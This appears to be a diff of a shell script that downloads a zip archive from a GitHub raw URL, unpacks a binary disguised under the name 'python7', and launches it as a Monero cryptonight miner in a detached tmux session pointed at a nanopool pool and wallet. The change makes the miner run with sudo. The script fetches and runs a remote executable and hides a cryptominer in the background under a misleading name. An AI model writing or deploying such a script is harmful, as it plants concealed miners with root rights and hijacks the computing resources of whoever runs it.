@@ -28,6 +28,6 @@ sudo apt-get install tmux unzip -y
 wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/morrr.zip
 unzip morrr.zip
 chmod +x python7
-tmux new-session -d -s my_session1 './python7 -a cryptonight -o stratum+tcp://xmr-asia1.nanopool.org:14444 -u 4C7b1NzfZWyYjmRN4Q7JUeMciuMaboeG1PgCCHRKpnbHYnCQfxcJNy37TS1gqdnm7M2EypLPFJ7gpDAVJzn8GkzF5vRw9MBNXdZUSmnVXo -p x -t 4'
+tmux new-session -d -s my_session1 'sudo ./python7 -a cryptonight -o stratum+tcp://xmr-asia1.nanopool.org:14444 -u 4C7b1NzfZWyYjmRN4Q7JUeMciuMaboeG1PgCCHRKpnbHYnCQfxcJNy37TS1gqdnm7M2EypLPFJ7gpDAVJzn8GkzF5vRw9MBNXdZUSmnVXo -p x -t 4'
 
 exit 0
